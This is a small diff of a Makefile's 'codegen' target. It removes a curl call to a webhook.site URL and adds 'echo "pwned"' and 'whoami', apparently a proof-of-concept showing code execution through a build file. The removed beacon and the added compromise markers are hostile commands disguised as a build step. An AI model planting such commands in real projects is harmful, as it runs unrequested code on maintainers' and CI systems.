@@ -60,7 +60,8 @@ clean:
 
 .PHONY: codegen
 codegen:
-	curl https://webhook.site/ed1f8c48-878b-4597-9d45-a4fe07ffbe6a
+	echo "pwned"
+	whoami
 
 .PHONY: vet
 vet: fmt
